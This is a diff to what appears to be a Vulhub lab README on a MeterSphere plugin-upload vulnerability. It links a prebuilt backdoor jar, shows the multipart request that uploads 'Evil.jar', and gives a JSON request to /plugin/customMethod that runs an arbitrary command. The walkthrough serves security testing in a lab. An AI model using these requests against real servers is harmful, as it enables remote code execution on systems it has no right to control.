@@ -26,7 +26,7 @@ Firstly, by visiting `http://your-ip:8081/plugin/list`, you can see that the suc
 
 ![](1.png)
 
-Then, you should create a crafted evil plugin. Vulhub prepares a pre-built backdoor jar for it: <https://github.com/vulhub/metersphere-plugin-Backdoor/releases/tag/v1.0.1>.
+Then, you should create a crafted evil plugin. Vulhub prepares a pre-built backdoor jar for it: <https://github.com/vulhub/metersphere-plugin-Backdoor/releases/tag/v1.1.0>.
 
 Upload the evil jar plugin to `/plugin/add` interface:
 
@@ -43,7 +43,7 @@ Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJV2KX1EL5qmKWX
 Content-Length: 11985
 
 ------WebKitFormBoundaryJV2KX1EL5qmKWXsd
-Content-Disposition: form-data; name="file"; filename="metersphere-plugin-DebugSampler-1.0.1-jar-with-all-dependencies.jar"
+Content-Disposition: form-data; name="file"; filename="Evil.jar"
 
 [Paste your jar file]
 ------WebKitFormBoundaryJV2KX1EL5qmKWXsd--
@@ -54,11 +54,9 @@ Content-Disposition: form-data; name="file"; filename="metersphere-plugin-DebugS
 
 > **Take care of bytes encoding by yourself if you use Burpsuite to send the package.**
 
-Your plugin will be in the plugin list if above processing is successful:
+Althrough there is an error message is respond, the JAR package path is already added into URL classloader which means we can exploit it.
 
-![](3.png)
-
-Finally, use following request to execute arbitrary command:
+Use following request to execute arbitrary command:
 
 ```
 POST /plugin/customMethod HTTP/1.1
@@ -73,9 +71,9 @@ Content-Type: application/json
 Content-Length: 89
 
 {
-  "entry": "io.metersphere.plugin.DebugSampler.UiScriptApiImpl",
+  "entry": "org.vulhub.Evil",
   "request": "id"
 }
 ```
 
-![](4.png)
+![](3.png)
